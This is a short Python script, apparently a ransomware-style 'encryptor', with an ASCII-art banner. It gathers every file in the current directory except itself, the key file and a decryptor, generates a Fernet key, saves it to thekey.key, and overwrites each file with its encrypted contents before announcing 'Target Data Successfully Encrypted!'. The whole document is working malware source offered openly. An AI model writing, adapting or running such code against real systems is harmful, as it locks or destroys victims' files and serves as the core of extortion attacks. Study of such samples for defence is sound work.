#!/usr/bin/env python3

import os
import sys
import time
from sys import stdout
from time import sleep

import cryptography.fernet
from cryptography.fernet import Fernet


def xclear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


def animx(text):
    for c in text:
        stdout.write(c)
        stdout.flush()
        sleep(0.0001)
    print()

xclear()

xbanner = """                                                         
                                          .11                                             
                                      .110000.                                            
                                ..11000001.  ....                                         
                        ....1100000011..         .....                                    
                     10000000011..                    .......                             
                    .001...               .10...             .                            
                    .00.              ...1000  1...                                       
                    .00.           .111100000  .   ...            .                       
                    .00.          11100000000  .      .           .                       
                    .00.         111000000000  .                  .                       
                    .00.        .0.0000000000                     1                       
                     00.      ...110000000000                     1                       
                     00.      ..1011111000000       .             1                       
                     101      .10010000111000  ....              ..                       
                     100      .0001  ..110000         .          1.                       
                     .00        .10001..   ..     ....           1                        
                      101        0...100011. .....              ..                        
                      .00        11 .1 ..1000                   1                         
                       001       .0 .0  1. ..         .        ..                         
                        00.      .0. 0  0. 11      .  .        1                          
                        .01    .0111.0. 01 10   .  . .        1.                          
                         101    100110. 11 10   .  .         1.                           
                          101    .101.1101 .0   . .         1.                            
                           101     .001.11..0  . .    .    1.                             
                            .00.     1001.100 ...   .    .1                               
                              001      1001.1.    .     1.                                
                               .00.      1001  ..     .1                                  
                                 001.      .1..     .1.                                   
                                  .001.           .1.                                     
                                     001.      .11.                                       
                                       0001. .1.                                          
                                         .000                                             
                                            .                                             
"""

print(xbanner)

files = []
for file in os.listdir():
    if file == "encryptor.py" or file == "thekey.key" or file == "decryptor.py":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contentEncrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contentEncrypted)
        animx(f"->> {file}")

animx("\nTarget Data Successfully Encrypted!")
